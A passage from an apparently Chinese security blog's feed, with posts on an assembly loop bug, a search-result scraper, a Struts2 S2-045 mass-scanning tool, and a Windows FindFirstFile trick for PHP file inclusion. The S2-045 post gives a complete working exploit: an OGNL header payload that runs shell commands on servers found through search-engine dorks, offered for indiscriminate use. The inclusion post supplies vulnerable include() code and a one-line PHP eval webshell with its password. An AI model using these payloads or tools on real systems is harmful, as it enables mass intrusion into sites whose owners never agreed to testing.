(0042301c)</span><br><span class="line">004010AD   call        printf (004011a0)</span><br><span class="line">004010B2   add         esp,4</span><br><span class="line">14:       &#125;</span><br><span class="line">004010B5   jmp         HelloWorld+6Eh (0040108e)</span><br><span class="line">15:   &#125;</span><br></pre></td></tr></table></figure></p>
<p>从<code>int i = 0;</code>开始看直到<code>for(i=0; i&lt;=10; i++)</code>的堆栈图是</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png" alt="snipaste_20170309_170508.png"></p>
<p>第一次进入循环开始先把0放到了[ebp-4]，然后跳到了<code>00401097   cmp dword ptr [ebp-4],0Ah</code>以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行<code>jg HelloWorld+97h (004010b7)</code>跳到004010b7函数结束<br>第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行<code>0040109D</code>处的语句，此时<code>ECX</code>中的值变成了[ebp-4]中的值也就是0，然后<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>将0放到<code>ebp+ecx*4-2Ch</code>处也就是<code>EBP-2C</code>处，下面的两条语句不用管是执行输出的，然后到了<code>add  esp,4</code>将栈顶的值加4，这里我们无需关注栈顶，然后<code>jmp HelloWorld+6Eh (0040108e)</code>跳回到<code>0040108e</code>继续执行</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png" alt="snipaste_20170309_170508.png"></p>
<p>跳到<code>0040108E   mov  eax,dword ptr [ebp-4]</code>开始执行，紧接着这三条语句的作用是把<code>EBP-4</code>中的值加了1，也就是<code>EBP-4</code>中的值现在为1<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax,dword ptr [ebp-4]</span><br><span class="line">add eax,1</span><br><span class="line">mov dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure></p>
<p>cmp比较之后再次执行循环体，循环体完成后再次跳到<code>0040108e</code>，此时<code>EBP-28</code>的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png" alt="snipaste_20170309_172648.png"></p>
<p>紧接着下次执行后</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png" alt="snipaste_20170309_172805.png"></p>
<p>直到这个数组长度为10的数组执行到第十次</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png" alt="snipaste_20170309_173122.png"></p>
<p>此时再次跳转到<code>0040108e</code>，然后<code>EBP-4</code>中的值再次增加了1，现在也就是<code>EBP-4</code>中的值变为了0A，cmp比较之后<code>EBP-4</code>中的值依旧不比0A大，接着执行<code>mov ecx,dword ptr [ebp-4]</code>，此时ECX的值变成了0A，接着执行<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>也就是<code>mov dword ptr [ebp-4],0</code></p>
<p>然后呢，你发现了什么？？？就是他喵的<code>EBP-4</code>中的值变成了0</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png" alt="snipaste_20170309_173729.png"></p>
<p>变成0代表着什么？？？<code>EBP-4</code>中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址<code>EBP-4</code>中的值清零</p>
<p>这也就是为什么上面这段c语言代码会一直不停地循环的原因</p>
<p><strong>转载请注明出处</strong></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>360搜索引擎取真实地址-python代码</title>
    <url>/2017/03/08/360-Search-Engine-get-realURL-with-python.html</url>
    <content><![CDATA[<p>还是个比较简单的，不像百度有加密算法</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou</span><br></pre></td></tr></table></figure>
<p>网址是上面这个样子，没加密直接取就好了，去掉头<code>http://www.so.com/link?url=</code>和尾<code>&amp;q=</code>一直到末尾的部分，剩下的就可以吃了<br><a id="more"></a><br>那么规则我们就可以写出来了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]</span><br></pre></td></tr></table></figure></p>
<p><code>a[&#39;href&#39;]</code>是待处理网址,<code>a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)</code>的部分为<code>?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452</code></p>
<p>最后还需要用unquote解码</p>
<ul>
<li>在python3中是<code>urllib.parse.unquote</code></li>
<li>在python2中是<code>urllib.unquote</code></li>
</ul>
<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse360</span><span class="params">(keyword, pagenum)</span>:</span></span><br><span class="line">    keywordsBaseURL = <span class="string">'https://www.so.com/s?q='</span> + str(keyword) + <span class="string">'&amp;pn='</span></span><br><span class="line">    pnum = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</span><br><span class="line">        baseURL = keywordsBaseURL + str(pnum)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = requests.get(baseURL, headers=headers)</span><br><span class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</span><br><span class="line">            urls = [unquote(a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]) <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'li.res-list &gt; h3 &gt; a'</span>)]</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">yield</span> url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            pnum += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>用法示例:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parse360(<span class="string">"keyword"</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> url:</span><br><span class="line">            <span class="keyword">print</span> url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h1 id="最后上一张测试图"><a href="#最后上一张测试图" class="headerlink" title="最后上一张测试图"></a>最后上一张测试图</h1><p><img src="https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png" alt="snipaste_20170308_214047.png"></p>
<p><strong>转载请注明出处</strong></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>s2-045漏洞批量检测工具</title>
    <url>/2017/03/07/st2-045-batch-Test-Tool.html</url>
    <content><![CDATA[<p>今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事</p>
<p>测试图<br><img src="https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png" alt="TIM图片20170307212124.png"><br><a id="more"></a></p>
<p><strong>2017-3-8更新</strong></p>
<ul>
<li>增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，<del>win版的exe未更新，需要的自行用pyinstaller打包为exe</del></li>
<li>之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在</li>
<li>win版exe已经打包</li>
<li><strong>重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论</strong></li>
<li><strong>exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子</strong></li>
<li><strong>有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅</strong><br><img src="https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png" alt="TIM图片20170308132948.png"></li>
</ul>
<p><strong>依赖包的安装</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip</span><br><span class="line">//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上</span><br><span class="line">//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码</span><br><span class="line">pip install requests</span><br><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure></p>
<p>对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词<br>最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久<br>后来改成关键词就是自己输入，但是又感觉太麻烦<br>然后就变成了现在的读取关键词然后标号直接输入序号就可以<br>途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了</p>
<p><strong>说明</strong><br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python s2-045.py 9 10</span><br></pre></td></tr></table></figure></p>
<p>第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数<br>序号与关键词的对应，可以直接运行<code>python s2-045.py</code>就可以产看帮助<br>脚本采用的bing搜索引擎，<strong>文件我会打包在下面</strong></p>
<p>上代码,<strong>python2和3通用</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys,requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">keyword = &#123;&#125;</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"keyword.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> keywordLine <span class="keyword">in</span> f:</span><br><span class="line">        keyword[str(i)] = keywordLine.strip()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">usage = <span class="string">'''</span></span><br><span class="line"><span class="string">usage : python s2-045.py 0 10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">first parameter is your filename</span></span><br><span class="line"><span class="string">second parameter is your keyword's number which will be used by Bing</span></span><br><span class="line"><span class="string">Third parameter is the page number you want to crawl\n'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(actionURL)</span>:</span></span><br><span class="line">    data = <span class="string">'--447635f88b584ab6b8d9c17d04d79918\</span></span><br><span class="line"><span class="string">    Content-Disposition: form-data; name="image1"\</span></span><br><span class="line"><span class="string">    Content-Type: text/plain; charset=utf-8\</span></span><br><span class="line"><span class="string">    \</span></span><br><span class="line"><span class="string">    x\</span></span><br><span class="line"><span class="string">    --447635f88b584ab6b8d9c17d04d79918--'</span></span><br><span class="line">	</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Content-Length"</span> : <span class="string">"155"</span>, </span><br><span class="line">        <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>, </span><br><span class="line">        <span class="string">"Content-Type"</span> : <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>, </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request = requests.post(actionURL, data=data, headers=header, timeout = <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"None"</span>, <span class="string">"Refused"</span></span><br><span class="line">    <span class="keyword">return</span> request.text, request.status_code</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnURLList</span><span class="params">()</span>:</span></span><br><span class="line">    keywordsBaseURL = <span class="string">'http://cn.bing.com/search?q='</span> +keyword[sys.argv[<span class="number">1</span>]]+ <span class="string">'&amp;first='</span></span><br><span class="line">    n =<span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; int(sys.argv[<span class="number">2</span>]):</span><br><span class="line">        baseURL = keywordsBaseURL + str(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(baseURL)</span><br><span class="line">            soup = BeautifulSoup(req.text, <span class="string">"html.parser"</span>)</span><br><span class="line">            text = soup.select(<span class="string">'li.b_algo &gt; h2 &gt; a'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</span><br><span class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.action'</span>)]+<span class="string">'.action'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'.do'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</span><br><span class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.do'</span>)]+<span class="string">'.do'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.do'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                standardURL = [url[<span class="string">'href'</span>] <span class="keyword">for</span> url <span class="keyword">in</span> text]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"HTTPERROR"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        i += <span class="number">10</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> standardURL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        print(usage)</span><br><span class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> keyword.items():</span><br><span class="line">            print(<span class="string">"%s is %s"</span>%(k, v))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> urlList <span class="keyword">in</span> returnURLList():</span><br><span class="line">        <span class="keyword">for</span> actionURL <span class="keyword">in</span> urlList:</span><br><span class="line">            text, code = poc(actionURL)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'hereisaexp'</span> <span class="keyword">in</span> text:</span><br><span class="line">                print(str(code) + <span class="string">"----Successful----"</span> + actionURL + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"AvailableURL.txt"</span>,<span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(actionURL+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(code)+<span class="string">'----'</span>+actionURL+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong><a href="http://file.codecat.one" target="_blank" rel="noopener">下载地址</a></strong></p>
<p><strong>打包了win版，大家可以直接使用，例如在该exe目录下执行<del>（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）</del></strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">s2-045.exe 9 10</span><br></pre></td></tr></table></figure></p>
<p><strong>其他用法参照上面</strong><br><strong>转载请注明出处</strong></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows FindFirstFile利用</title>
    <url>/2017/03/04/Windows-FindFirst-Exploit.html</url>
    <content><![CDATA[<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。<br><a id="more"></a><br>我们来做个简单的测试，测试代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p> 再在同目录下新建一个文件名为”123456.txt”的文件，内容为<code>phpinfo()</code>函数，请求<code>/1.php?file=1&lt;&lt;</code>即可包含。<br> <img src="https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png" alt="d8336189e9e8ab752ec855e7ed94a9b7.jpg.png"></p>
<h1 id="常用的漏洞代码"><a href="#常用的漏洞代码" class="headerlink" title="常用的漏洞代码"></a>常用的漏洞代码</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">		<span class="keyword">include</span>($_GET[page]);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'show.php'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span> . $_GET[page]);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span>. $_GET[page] . <span class="string">'.php'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h1><ol>
<li><p>php中代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>123456.txt中代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>123456.TXT里面可以换成一句话木马，代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"admin"</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>url:<a href="http://127.0.0.1/1.php?file=12" target="_blank" rel="noopener">http://127.0.0.1/1.php?file=12</a>&lt;&lt;<br>密码：admin<br><strong>注意</strong>：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】</p>
<p><img src="https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png" alt="acccc1eb9b5be30878b4f979f2edadfc.jpg.png"></p>
<h1 id="windows的文件系统机制引发的PHP路径爆破问题分析"><a href="#windows的文件系统机制引发的PHP路径爆破问题分析" class="headerlink" title="windows的文件系统机制引发的PHP路径爆破问题分析"></a>windows的文件系统机制引发的PHP路径爆破问题分析</h1><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>此次所披露的是以下网页中提出的问题所取得的测试结果：</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="noopener">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$url = <span class="string">'1.ph'</span> . chr($i);</span><br><span class="line">		$tmp = @file_get_contents($url);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i) . <span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>已知1.php存在，以上脚本访问的结果是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.php</span><br><span class="line">1.phP</span><br><span class="line">1.ph&lt;</span><br><span class="line">1.ph&gt;</span><br></pre></td></tr></table></figure></p>
<p>都能得到返回。<br>前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。</p>
<p>测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0</p>
<p>测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3</p>
<p>经测试我们得出的结论是：<strong>该漏洞影响所有的windows+php版本</strong></p>
<h2 id="深入探查模糊测试的结果"><a href="#深入探查模糊测试的结果" class="headerlink" title="深入探查模糊测试的结果"></a>深入探查模糊测试的结果</h2><p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $j++) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $i++) &#123;</span><br><span class="line">			$url = <span class="string">'1.p'</span> . chr($j) . chr($i);</span><br><span class="line">			$tmp = @file_get_contents($url);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($j) . chr($i) . <span class="string">" "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果<a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85" target="_blank" rel="noopener">(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)</a>.aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：<a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3</a></p>
<p>但是此bug至今未被任何windows旗下所发行的任何版本修复!</p>
<p>我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
<p>此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])&#123;</span><br><span class="line">	WIN32_FIND_DATA FindFileData;</span><br><span class="line">	HANDLE hFind;</span><br><span class="line">	<span class="keyword">if</span>( argc != <span class="number">2</span> )&#123;</span><br><span class="line">		_tprintf(TEXT(<span class="string">"Usage: %s [target_file] "</span>), argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_tprintf (TEXT(<span class="string">"Target file is %s "</span>), argv[<span class="number">1</span>]);</span><br><span class="line">	hFind = FindFirstFile(argv[<span class="number">1</span>], &amp;FindFileData);</span><br><span class="line">	<span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">"FindFirstFile failed (%d) "</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		_tprintf (TEXT(<span class="string">"The first file found is %s "</span>), FindFileData.cFileName);</span><br><span class="line">		FindClose(hFind);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当传入参数”c:o&lt;”时，成功访问到boot.ini文件。</p>
<h2 id="利用方法总结"><a href="#利用方法总结" class="headerlink" title="利用方法总结"></a>利用方法总结</h2><ol>
<li><p>当调用FindFirstFile()函数时，”&lt;”被替换成” <em> ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成”</em>”,应当采用”&lt;&lt;”**</p>
